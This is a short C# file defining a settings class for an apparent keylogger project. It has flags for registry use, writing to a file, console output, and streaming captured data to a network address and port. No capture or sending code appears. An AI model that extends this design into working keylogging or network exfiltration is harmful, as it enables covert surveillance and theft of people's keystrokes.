using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Settings
    {
        public bool UseRegistry { get; set; } = false;
        public bool WriteToFile { get; set; } = false;
        public bool StreamOverNetwork { get; set; } = false;
        public string NetworkAddress { get; set; } = null;
        public int NetworkPort { get; set; } = -1;
        public bool WriteToConsole { get; set; } = false;
    }
}
